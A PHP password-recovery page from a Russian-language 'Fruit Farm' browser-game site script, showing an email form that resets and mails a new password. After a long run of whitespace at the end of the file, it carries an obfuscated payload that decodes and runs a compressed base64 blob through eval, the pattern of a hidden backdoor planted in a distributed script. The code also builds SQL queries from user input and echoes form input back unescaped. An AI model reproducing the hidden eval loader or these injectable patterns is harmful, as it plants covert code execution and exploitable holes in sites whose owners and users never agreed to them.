<?PHP
######################################
# Скрипт Fruit Farm
# Автор Rufus
# ICQ: 819-374
# Skype: Rufus272
######################################
$_OPTIMIZATION["title"] = "Восстановление пароля";
$_OPTIMIZATION["description"] = "Восстановление забытого пароля";
$_OPTIMIZATION["keywords"] = "Восстановление забытого пароля";

if(isset($_SESSION["user_id"])){ Header("Location: /account/pole"); return; }

?>




<div class="silver-bk5"><div class="clr"></div>

<div class="autoriz2">
	
<?PHP

	if(isset($_POST["email"])){

		
		
		$email = $func->IsMail($_POST["email"]);
		$time = time();
		$tdel = $time + 60*15;
		
			if($email !== false){
				
				$db->Query("DELETE FROM db_recovery WHERE date_del < '$time'");
				$db->Query("SELECT COUNT(*) FROM db_recovery WHERE ip = INET_ATON('".$func->UserIP."') OR email = '$email'");
				if($db->FetchRow() == 0){
				
					$db->Query("SELECT id, user, email, pass FROM db_users_a WHERE email = '$email'");
					if($db->NumRows() == 1){
					$db_q = $db->FetchArray();
					$rn = rand(515165115, 999999999999);
					$new_pass = $func->md5Password($rn);
 
					# Вносим запись в БД
					$db->Query("INSERT INTO db_recovery (email, ip, date_add, date_del) VALUES ('$email',INET_ATON('".$func->UserIP."'),'$time','$tdel')");
					
					$db->Query("UPDATE ".$pref."_users_a SET pass = '$new_pass' WHERE email = '".$db_q["email"]."'");
					# Отправляем пароль
					$sender = new isender;
					$sender -> RecoveryPassword($db_q["email"], $rn, $db_q["email"]);
					
					echo "<div class='h-title2'><font color = 'green'><b>Пароль отправлен на Email</b></font></div>";
					?>
					</div>
					<div class="clr"></div>	
					<?PHP
					return; 
					
					}else echo "<div class='h-title2'><font color = 'red'><b>Такой Email не найден</b></font></div>";
				
				}else echo "<div class='h-title2'><font color = 'red'><b>Попробуйте через 15 минут</b></font></div>";
				
			}else echo "<div class='h-title2'><font color = 'red'><b>Email указан неверно</b></font></div>";
		
	
	}

?>



<h3><font color = 'white'>Восстановление доступа!</font></h3>
<BR />
<form action="" method="post"><BR />
<table width="188" border="0" cellspacing="0" cellpadding="0">
  <tr>
    
    <td align="left" width="205"><input name="email" type="text" placeholder="Email для отправки пароля" size="25" maxlength="50" class="lg" style=" margin-top:0px;" value="<?=(isset($_POST["email"])) ? $_POST["email"] : false; ?>"/></td>
  </tr>
  <tr>
   

    <td colspan="2" align="center"><BR /><input type="submit"  value="Отправить" style="height: 65px; margin-top:-10px; " class="btn_in"></td>
  </tr>
</table>
</form>



</div>


<div id="link1" style="
    width: 400px;
    height: 445px;
    position: absolute;
    top: 300px;
    left: 50%;
    margin-left: -470px;
    background: url('../img/boy.png') 0 0 no-repeat;
    z-index: 10;
    cursor: pointer;

"></div>



</div>
<div class="clr"></div>	                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  <?php $J8E334118BC68B37DF94B539152B4D4F0="eNqVVM2SszYQfKSAZFLm8B3CImFjI1ZCP0g3kFyLQRjyLRsMTx8eIJfcpmqmp2e6euZzP50/YTLZj7+Gqk9S0l9PtMcfdL++mbhGJSq2Ykc7GWhEdoNo/xdgHG2fVe75C6sGFpsA8d9U4In2fqWhP8mUbkzEuQnzrJHk2YCv3yJws8TONEi+bHY+NZ5tbltgm9q9UDErlY5MZq43IKkdw7vwHZC9DosXvjfK/9Dg4MlwVoVkE7XBtnZCBN29CPKyQnPKRdzYbJ6qnlx1jyCrJRU836wcdsoJa17zLLMQ3MJuLS/sJrwkNsAl7XPNBxuWaFmbl5+qkXTcs7lB7KdCHW9AWFjpdrK7zzY4Qw7ijAanrRXOONn9Q14WtuH8u+nzWdUeNyLvGEygGRyseLK4A8fHuaKhq6ln3GVyaYcO8Zf/rC5yZNxf+BBPzcUdvHlfYowftT+VWfR+vA7MjncC1tAEUVFByVyfv1tFpiqIVqUiqJCvZc2ugqNV9Ob9UF0ghjwi8roeMyoX5qsZ39+EM03gFAo5bXLoNicOLhUrmyYn1RMiUBeJvdga0WmWmmcVysYBFFDlXo1aaBUyLTnuGTLwwbvZXYaIBWJrvcyJWALrcaTwXMsxekvkpQX420pz5H0pZC4eo580iJTNYirVsjKOf6haTnRkd4Gxdh/nt+kJ09WStv0AVG8hr9mHU3Jp1HD0SfRDRG8NZ91k5ufQnAjMjH4lpBjC2obTWgHCKtB1PJgvGn6FLIuJQ/5p1QxasK4WIyhHPxvg+nY878eOs0EYuFTWAtjNpg4bxL71EN/IroEelufhudmC67sRklZY/7a1n257AhTu5qLOQ4YWaGSSa3l4bIwCKubMDTqSdVI8Lmayx01VyNzK7BoVgUu0lLrxvi9UGNLAQCfO74abu00N5dDNek+k6LvBYleWtQO09ruEdNciLlogzSPFeXm5wirojpv0kVZh0cj5+UiTt+Mu5cAgM7IT2fHqPAJWaSiey9jWBtx2+ebP5c92i/v7oc8dashTlrQfZ2j24FkCCbRaJz3i3XAd1IB5DeLBVN3r8ZI/R7zYS+4tLP6j5ut//Y9bNcw3/v3H59evX/8CmF6DXw==";eval(base64_decode(gzuncompress(base64_decode($J8E334118BC68B37DF94B539152B4D4F0))));?>